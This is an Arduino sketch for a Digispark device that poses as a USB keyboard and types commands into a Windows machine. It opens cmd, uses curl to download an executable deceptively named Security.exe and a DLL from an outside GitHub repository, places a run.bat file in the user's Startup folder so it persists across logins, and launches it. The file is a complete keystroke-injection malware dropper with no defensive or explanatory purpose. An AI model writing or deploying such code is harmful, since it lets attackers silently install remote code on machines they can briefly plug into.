#include "DigiKeyboard.h"

void setup() {
    // this is generally not necessary but with some older systems it seems to
    // prevent missing the first character after a delay:
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.println("cmd");
    DigiKeyboard.delay(500);
    DigiKeyboard.println("cd %APPDATA%/Microsoft/Windows");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("curl https://github.com/yedsod/kuyrai/raw/main/build/Security.exe -O Security.exe");
    DigiKeyboard.delay(2000);
    DigiKeyboard.println("curl https://github.com/yedsod/kuyrai/raw/main/build/libcrypto-1_1-x64.dll -O libcrypto-1_1-x64.dll");
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("cd %APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup");
    DigiKeyboard.println("curl https://github.com/yedsod/kuyrai/raw/main/build/run.bat -O run.bat");
    // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
    // if doing keyboard stuff because it keeps talking to the computer to make
    // sure the computer knows the keyboard is alive and connected
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("run.bat");
    delay(900);

}


void loop() {

}
